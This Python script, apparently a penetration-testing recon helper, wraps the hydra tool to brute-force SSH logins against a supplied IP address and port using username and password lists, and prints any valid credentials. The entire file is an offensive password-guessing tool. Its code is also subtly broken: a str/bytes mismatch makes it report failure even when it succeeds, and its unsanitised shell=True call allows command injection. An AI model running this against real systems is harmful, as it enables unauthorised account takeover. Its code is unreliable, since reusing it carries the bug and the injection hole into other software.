import subprocess
import sys


def ssh_recon(ip_address, port, save_file_path, username_list, password_list):
    print("INFO: Performing hydra ssh scan against {ip}".format(ip=ip_address))
    hydra = "hydra -L {username_list} -P {password_list} -f " \
            "-o {save_file_path}/{ip}_sshhydra.txt -u {ip} -s {port} ssh".format(ip=ip_address, port=port,
                                                                                 username_list=username_list,
                                                                                 password_list=password_list,
                                                                                 save_file_path=save_file_path)
    try:
        results = subprocess.check_output(hydra, shell=True)
        resultarr = results.split(b"\n")
        for result in resultarr:
            if "login:" in result:
                print("[*] Valid ssh credentials found: {result}".format(result=result))
    except:
        print("INFO: No valid ssh credentials found")


if __name__ == "__main__":
    if len(sys.argv) != 6:
        print("Usage: sshrecon.py <ip address> <port> <save_file_path> <usernames_list> <password_list>")
        sys.exit(0)
    ssh_recon(ip_address=sys.argv[1].strip(), port=sys.argv[2].strip(), save_file_path=sys.argv[3],
              username_list=sys.argv[4], password_list=sys.argv[5])
